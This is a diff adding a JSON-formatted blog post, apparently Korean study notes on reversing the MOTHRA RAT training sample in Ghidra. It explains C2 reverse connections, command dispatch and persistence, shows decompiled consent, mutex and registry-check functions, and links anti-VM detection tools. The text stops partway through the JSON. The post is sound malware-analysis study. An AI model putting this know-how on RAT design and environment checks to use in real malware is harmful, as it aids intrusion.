@@ -1,0 +1,2573 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "ccb0b34b-561b-5d3b-b941-5c59f394191e",
+  "kind": "posts",
+  "title": "[Ghidra] 리버스 엔지니어링 기드라 실전 가이드 스터디 - chapter 6(MOTHRA RAT)",
+  "slug": "tistory-66",
+  "description": "0. MOTHRA RAT란https://www.hanbit.co.kr/lib/examFileDown.php?hed_idx=5986에서 다운 받을 수 있다. MOrdern Technique based Harmless program for Reversing and Analysis Rat의 약자로 리버스 엔지니어링 학습을 목적으로 작성된 무해한 모의 멀웨어 프로그램이다. Rat은 Remote Administration Tool로 C2(command and control)서버에 지정한 명령어를 클라이언트에서 실행하는 프로그램이다. 클라이언트는 c2서버로 request를 보내고 그 응답을 실행하는 명령어를 수신하고 결과를 다시 c2서버에 전송한다. 6장에서는 Mothra rat을 학습한다. 다음은 RAT 분석 ..",
+  "category": "Security / Reversing",
+  "date": "2026-01-29",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-01-29T02:33:59+09:00",
+  "updatedAt": "2026-03-04T15:37:42+09:00",
+  "sourceDigest": "8dfed992c4bc68865a7b7a23e05f7899936cfeb49e108e227ad14d6a454bc022",
+  "assets": [
+    {
+      "id": "a59ea131-2356-5107-8564-1c8507c6f136",
+      "name": "tistory-66-a59ea131-2356-5107-8564-1c8507c6f136.jpg",
+      "type": "image/jpeg",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/a59ea131-2356-5107-8564-1c8507c6f136.jpg",
+      "sha": "81eecea152274b4d569428cef432689bb7b027c0"
+    },
+    {
+      "id": "6cab4aa8-0105-5aa2-821e-d7a0a491a136",
+      "name": "tistory-66-6cab4aa8-0105-5aa2-821e-d7a0a491a136.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/6cab4aa8-0105-5aa2-821e-d7a0a491a136.png",
+      "sha": "82862248bc01b4596e69b6bbcc57a11d3281680f"
+    },
+    {
+      "id": "7ce6ed0b-d10e-5890-8010-0f24bb8206aa",
+      "name": "tistory-66-7ce6ed0b-d10e-5890-8010-0f24bb8206aa.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/7ce6ed0b-d10e-5890-8010-0f24bb8206aa.png",
+      "sha": "b46d37fa82f1662a4cb097853c6cd61ea9bff870"
+    },
+    {
+      "id": "89a68ac1-5ad1-511a-b31d-065564a13e52",
+      "name": "tistory-66-89a68ac1-5ad1-511a-b31d-065564a13e52.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/89a68ac1-5ad1-511a-b31d-065564a13e52.png",
+      "sha": "8714c2db4e28997c44d076c13a2f048046e7ed71"
+    },
+    {
+      "id": "a8638866-51dc-5760-a87b-99a6bbb98e12",
+      "name": "tistory-66-a8638866-51dc-5760-a87b-99a6bbb98e12.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/a8638866-51dc-5760-a87b-99a6bbb98e12.png",
+      "sha": "8abae8dd40e760befa4d56d51575746fe9346561"
+    },
+    {
+      "id": "2c7b6489-8597-5867-94f0-411e7f80dde6",
+      "name": "tistory-66-2c7b6489-8597-5867-94f0-411e7f80dde6.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/2c7b6489-8597-5867-94f0-411e7f80dde6.png",
+      "sha": "9b0e11c2119a8260c7c7ffd9670c305a560af4c4"
+    },
+    {
+      "id": "6d1f01b9-22bc-58cd-af10-02e363fe1063",
+      "name": "tistory-66-6d1f01b9-22bc-58cd-af10-02e363fe1063.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/6d1f01b9-22bc-58cd-af10-02e363fe1063.png",
+      "sha": "006dde0d5c40ab59008c2876530537f387330b66"
+    },
+    {
+      "id": "0c608809-ddad-5be2-9fe8-adcccc81a4e6",
+      "name": "tistory-66-0c608809-ddad-5be2-9fe8-adcccc81a4e6.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/0c608809-ddad-5be2-9fe8-adcccc81a4e6.png",
+      "sha": "a98377ebeb244e65ea4435160a3ce35c98efdc44"
+    },
+    {
+      "id": "4bd40c0f-4874-587f-b002-66ec36902d67",
+      "name": "tistory-66-4bd40c0f-4874-587f-b002-66ec36902d67.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/4bd40c0f-4874-587f-b002-66ec36902d67.png",
+      "sha": "aa7aaaf64c4eb285dec766a425f689caae828565"
+    },
+    {
+      "id": "0970d45d-c658-54ef-8de2-7f6a5d23fc22",
+      "name": "tistory-66-0970d45d-c658-54ef-8de2-7f6a5d23fc22.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/0970d45d-c658-54ef-8de2-7f6a5d23fc22.png",
+      "sha": "a537c16b35964503cf7ffc92b83899afa66d2511"
+    },
+    {
+      "id": "8d9e1bb3-d799-5006-97b6-c2440d29bf98",
+      "name": "tistory-66-8d9e1bb3-d799-5006-97b6-c2440d29bf98.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/8d9e1bb3-d799-5006-97b6-c2440d29bf98.png",
+      "sha": "e044536dcae555fe547a821a86710a88ecf1553a"
+    },
+    {
+      "id": "406f19d8-a5a7-588f-8f08-f3df3ac8df2c",
+      "name": "tistory-66-406f19d8-a5a7-588f-8f08-f3df3ac8df2c.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/406f19d8-a5a7-588f-8f08-f3df3ac8df2c.png",
+      "sha": "2445ba1211f08be9d594c554960128a4f6799f6e"
+    },
+    {
+      "id": "2bbc2dbc-ae29-50c7-b66b-7cc39b0ff344",
+      "name": "tistory-66-2bbc2dbc-ae29-50c7-b66b-7cc39b0ff344.png",
+      "type": "image/png",
+      "path": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/2bbc2dbc-ae29-50c7-b66b-7cc39b0ff344.png",
+      "sha": "7239656205c6626e014c0726be7c7b45666a95d5"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "a59ea131-2356-5107-8564-1c8507c6f136",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/a59ea131-2356-5107-8564-1c8507c6f136.jpg",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "0. MOTHRA RAT란"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://www.hanbit.co.kr/lib/examFileDown.php?hed_idx=5986",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://www.hanbit.co.kr/lib/examFileDown.php?hed_idx=5986"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "에서 다운 받을 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "MOrdern Technique based Harmless program for Reversing and Analysis Rat의 약자로 리버스 엔지니어링 학습을 목적으로 작성된 무해한 모의 멀웨어 프로그램이다. Rat은 Remote Administration Tool로 C2(command and control)서버에 지정한 명령어를 클라이언트에서 실행하는 프로그램이다. 클라이언트는 c2서버로 request를 보내고 그 응답을 실행하는 명령어를 수신하고 결과를 다시 c2서버에 전송한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "6장에서는 Mothra rat을 학습한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "다음은 RAT 분석 학습의 핵심 요소이다."
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "attrs": {
+          "start": 1
+        },
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "통신 구조 (Reverse Connection) 방화벽의 인바운드 차단 정책을 우회하기 위해 감염된 PC가 C2 서버로 먼저 연결을 시도하는 방식이다. 주기적으로 접속하여 명령을 확인하는 비코닝(Beaconing) 신호를 포착해야한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "명령어 분기 (Command Dispatcher) C2 서버로부터 수신한 패킷(명령어 코드)을 파싱하여 특정 악성 행위로 연결해주는 Switch-Case 또는 If-Else 구조이다. 이 분기문을 식별하면 해당 RAT이 수행할 수 있는 모든 기능을 한 번에 파악할 수 있다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "지속성 (Persistence) 재부팅 후에도 악성코드가 계속 실행되도록 시스템에 상주하는 메커니즘이다. 주로 레지스트리 Run 키나 서비스 등록을 통해 이루어지며, 프로그램 시작 시점에 발생하는 자가 복제 및 레지스트리 조작 행위를 추적해야 한다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Mothra rat은 다음 과 같은 구조를 가졌다"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "6cab4aa8-0105-5aa2-821e-d7a0a491a136",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/6cab4aa8-0105-5aa2-821e-d7a0a491a136.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. 사전 세팅"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "GZF는 Ghidra Zip File의 약자로, Ghidra(기드라) 프로젝트 파일 형식 중 하나"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "데이터 타입을 잘 보기 위해서 "
+          },
+          {
+            "type": "text",
+            "text": "https://github.com/AllsafeCyberSecurity/Ghidra_Data_Type",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://github.com/AllsafeCyberSecurity/Ghidra_Data_Type"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "306aef98-fb77-5d83-b452-70bdf512dc59",
+          "href": "https://github.com/AllsafeCyberSecurity/Ghidra_Data_Type",
+          "title": "GitHub - AllsafeCyberSecurity/Ghidra_Data_Type: for Windows Malware Analysis",
+          "description": "for Windows Malware Analysis. Contribute to AllsafeCyberSecurity/Ghidra_Data_Type development by creating an account on GitHub.",
+          "image": "https://yt010108.github.io/assets/imported/tistory/dcd7f420e698593d1bb06192183f7ca9651f991a141f1b2c8222e47167e37789.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "를 활용해 기드라에 불러온 후에 적용하면"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "7ce6ed0b-d10e-5890-8010-0f24bb8206aa",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/7ce6ed0b-d10e-5890-8010-0f24bb8206aa.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "안된다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "89a68ac1-5ad1-511a-b31d-065564a13e52",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/89a68ac1-5ad1-511a-b31d-065564a13e52.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "winapi_32에 apply function data type를 선택하면 데이터 타입이 잘 들어간다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "a8638866-51dc-5760-a87b-99a6bbb98e12",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/a8638866-51dc-5760-a87b-99a6bbb98e12.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "2c7b6489-8597-5867-94f0-411e7f80dde6",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/2c7b6489-8597-5867-94f0-411e7f80dde6.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. FIDB"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "FIDB란 라이브러리 파일의 함수를 자동으로 식별해준다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "FIDB는 Function ID Data Base의 약자로, 말씀하신 대로 리버스 엔지니어링 도구가 분석 대상 바이너리 내에서 이미 알려진 라이브러리 함수를 자동으로 식별하고 이름을 붙여주는 서명(Signature) 데이터베이스 파일입니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://github.com/AllsafeCyberSecurity/Ghidra_FIDB",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://github.com/AllsafeCyberSecurity/Ghidra_FIDB"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "e814ea80-7ac7-55cc-81cd-50a7605b8020",
+          "href": "https://github.com/AllsafeCyberSecurity/Ghidra_FIDB",
+          "title": "GitHub - AllsafeCyberSecurity/Ghidra_FIDB: Function ID for Malware Analysis",
+          "description": "Function ID for Malware Analysis. Contribute to AllsafeCyberSecurity/Ghidra_FIDB development by creating an account on GitHub.",
+          "image": "https://yt010108.github.io/assets/imported/tistory/125421f7e4c4cd58555a0241133ccf0c4b5aee74b2e660121d14a95b105c5d53.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "6d1f01b9-22bc-58cd-af10-02e363fe1063",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/6d1f01b9-22bc-58cd-af10-02e363fe1063.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. winmain"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Main (hInstance, hPrevInstance, lpCmdLine, nShowCmd)인자를 이렇게 받는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "entry에서 ___scrt_get_show_window_mode(); __get_narrow_winmain_command_line();를 통해서 인자를 가져온다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "0c608809-ddad-5be2-9fe8-adcccc81a4e6",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/0c608809-ddad-5be2-9fe8-adcccc81a4e6.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "main "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "fun00402da(msg_box)를 실행하고 그 값에 따라 종료하거나 fun 402d00(mutex)랑 fun402d80(reg_check)을 실행한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "undefined4 winmain(void)\n\n{\n  bool bVar1;\n  undefined3 extraout_var;\n  void *pvVar2;\n  \n  bVar1 = FUN_00402da0();\n  if (CONCAT31(extraout_var,bVar1) != 0) {\n    FUN_00402d00();\n    FUN_00402d80();\n    pvVar2 = FUN_00402cb0();\n    if (pvVar2 != (void *)0x0) {\n      FUN_00402c10((int)pvVar2);\n      return 0;\n    }\n  }\n  return 1;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN_00402da0(메시지박스 체크)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "메시지 박스를 실행한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "2인수는 표시할 메시지, 3인수는 메시지 상자의 제목, 4인수는 푸시버튼에 대응하는 값 "
+          },
+          {
+            "type": "text",
+            "text": "MB_YESNO",
+            "marks": [
+              {
+                "type": "bold"
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": "0x00000004L와 "
+          },
+          {
+            "type": "text",
+            "text": "MB_ICONQUESTION",
+            "marks": [
+              {
+                "type": "bold"
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": "0x00000020L의 조합 IDYES =6, IDNO=7"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://learn.microsoft.com/ko-kr/windows/win32/api/winuser/nf-winuser-messageboxw",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/winuser/nf-winuser-messageboxw"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "c590f6e2-d57d-5176-9594-5572ff61329f",
+          "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/winuser/nf-winuser-messageboxw",
+          "title": "MessageBoxW 함수(winuser.h) - Win32 apps",
+          "description": "MessageBoxW(유니코드) 함수는 시스템 아이콘, 단추 집합 및 간략한 애플리케이션별 메시지가 포함된 모달 대화 상자를 표시합니다.",
+          "image": "https://yt010108.github.io/assets/imported/tistory/442161d0a89ddd202a5849002cc18d5b57bd56ee9ac99a5fb5e9286b23f4d216.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "bool FUN_00402da0(void)\n\n{\n  int iVar1;\n  \n  iVar1 = MessageBoxW((HWND)0x0,\n                      L\"This is a training program for reverse engineering.\\nDo you agree to run thi s program?\"\n                      ,L\"User agreement\",0x24);\n  return iVar1 == 6;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 환경 설정 및 체크"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN_402d00()(뮤텍스)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이름이 MothraMutex로 뮤텍스를 생성, getlasterror는 스레드의 마지막 에러값 에러코드0xb7은 이미 존재하는 스레드로 하나의 실행흐름만 가져간다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://learn.microsoft.com/ko-kr/windows/win32/api/synchapi/nf-synchapi-createmutexw",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/synchapi/nf-synchapi-createmutexw"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "bda36dc9-9644-5b49-9a20-74ce8a9910d2",
+          "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/synchapi/nf-synchapi-createmutexw",
+          "title": "CreateMutexW 함수(synchapi.h) - Win32 apps",
+          "description": "명명되거나 명명되지 않은 뮤텍스 개체를 만들거나 엽니다. (유니코드)",
+          "image": "https://yt010108.github.io/assets/imported/tistory/442161d0a89ddd202a5849002cc18d5b57bd56ee9ac99a5fb5e9286b23f4d216.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "5d10a876-ba65-513b-a6dd-007a9ab28147",
+          "href": "https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror",
+          "title": "GetLastError function (errhandlingapi.h) - Win32 apps",
+          "description": "Retrieves the calling thread's last-error code value.",
+          "image": "https://yt010108.github.io/assets/imported/tistory/442161d0a89ddd202a5849002cc18d5b57bd56ee9ac99a5fb5e9286b23f4d216.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void FUN_00402d00(void)\n\n{\n  DWORD DVar1;\n  \n  CreateMutexW((LPSECURITY_ATTRIBUTES)0x0,0,L\"MothraMutex\");\n  DVar1 = GetLastError();\n  if (DVar1 == 0xb7) {\n                    /* WARNING: Subroutine does not return */\n    ExitProcess(1);\n  }\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "4bd40c0f-4874-587f-b002-66ec36902d67",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/4bd40c0f-4874-587f-b002-66ec36902d67.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN402d80(레지스토리 체크)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "레지스토리를 체크하는 함수로 원하는 환경에서만 실행할 수 있게 만든다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void FUN_00402d80(void)\n\n{\n  bool bVar1;\n  undefined3 extraout_var;\n  \n  bVar1 = FUN_00402d30();\n  if (CONCAT31(extraout_var,bVar1) == 0) {\n                    /* WARNING: Subroutine does not return */\n    ExitProcess(1);\n  }\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN402d30()"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "레지스토리를 연다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 핸들은 "
+          },
+          {
+            "type": "text",
+            "text": "RegCreateKeyEx",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://learn.microsoft.com/ko-kr/windows/desktop/api/winreg/nf-winreg-regcreatekeyexa"
+                }
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": " 또는 "
+          },
+          {
+            "type": "text",
+            "text": "RegOpenKeyEx",
+            "marks": [
+              {
+                "type": "bold"
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": " 함수에서 반환되거나 다음 "
+          },
+          {
+            "type": "text",
+            "text": "미리 정의된 키",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://learn.microsoft.com/ko-kr/windows/desktop/SysInfo/predefined-keys"
+                }
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": "중 하나일 수 있습니다.80000002는hkey_local_machine으로 localmachine\\software\\mothra이다. 엑세스 권한은 read이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "레지스토리 키를 확인해 실행 환경의 정보를 확인한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://github.com/a0rtega/pafish",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://github.com/a0rtega/pafish"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "e2e03b03-a647-57b1-87bb-2efba798eea8",
+          "href": "https://github.com/a0rtega/pafish",
+          "title": "GitHub - a0rtega/pafish: Pafish is a testing tool that uses different techniques to detect virtual machines and malware analysis",
+          "description": "Pafish is a testing tool that uses different techniques to detect virtual machines and malware analysis environments in the same way that malware families do - a0rtega/pafish",
+          "image": "https://yt010108.github.io/assets/imported/tistory/8ddf9d78d1330f6290ed85f5a6c6c9d9a7418a939f1623b60df624c1c9b9b5ae.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://github.com/ayoubfaouzi/al-khaser",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://github.com/ayoubfaouzi/al-khaser"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "0dcbf8bc-78a4-58cf-89bc-38a14ff77b73",
+          "href": "https://github.com/ayoubfaouzi/al-khaser",
+          "title": "GitHub - ayoubfaouzi/al-khaser: Public malware techniques used in the wild: Virtual Machine, Emulation, Debuggers, Sandbox detec",
+          "description": "Public malware techniques used in the wild: Virtual Machine, Emulation, Debuggers, Sandbox detection. - GitHub - ayoubfaouzi/al-khaser: Public malware techniques used in the wild: Virtual Machine,...",
+          "image": "https://yt010108.github.io/assets/imported/tistory/2b9ed4fe3a57a4bc5099125d75693d91004cbaea657abd3ba08b8b9d7f54cfcc.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://github.com/hfiref0x/VMDE",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://github.com/hfiref0x/VMDE"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "216c9fa0-f2a4-5128-bcd5-a85a6238ad11",
+          "href": "https://github.com/hfiref0x/VMDE",
+          "title": "GitHub - hfiref0x/VMDE: Source from VMDE paper, adapted to 2015",
+          "description": "Source from VMDE paper, adapted to 2015. Contribute to hfiref0x/VMDE development by creating an account on GitHub.",
+          "image": "https://yt010108.github.io/assets/imported/tistory/4d12920800b985b1f85841f06e52d10a873c3ee5f75567f1385e0337126c462b.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://learn.microsoft.com/ko-kr/windows/win32/api/winreg/nf-winreg-regopenkeyexw",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/winreg/nf-winreg-regopenkeyexw"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "998bb279-91e2-588f-a5ba-a76ecea5eac3",
+          "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/winreg/nf-winreg-regopenkeyexw",
+          "title": "RegOpenKeyExW 함수(winreg.h) - Win32 apps",
+          "description": "지정된 레지스트리 키를 엽니다. 키 이름은 대/소문자를 구분하지 않습니다. (유니코드)",
+          "image": "https://yt010108.github.io/assets/imported/tistory/442161d0a89ddd202a5849002cc18d5b57bd56ee9ac99a5fb5e9286b23f4d216.png",
